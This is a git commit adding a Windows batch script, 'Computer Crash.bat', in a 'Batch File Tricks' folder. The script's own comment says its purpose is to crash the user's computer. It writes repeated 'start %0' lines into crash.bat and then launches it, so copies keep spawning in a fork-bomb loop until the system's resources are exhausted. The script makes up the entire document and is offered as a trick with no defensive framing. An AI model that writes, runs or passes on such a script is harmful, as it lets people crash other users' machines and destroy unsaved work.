86a836295dbdd571e2d39c83ca06a2c7a4152f57
Brady Lange <brady.lange111@gmail.com>
2018-06-09 13:51:34 -0500

    Create Computer Crash.bat

---
+++ Batch File Tricks/Computer Crash.bat
@@ -0,0 +1,22 @@
+@echo off
+
+rem Crash user computer.
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+echo start “” %0>>crash.bat
+start “” crash.bat
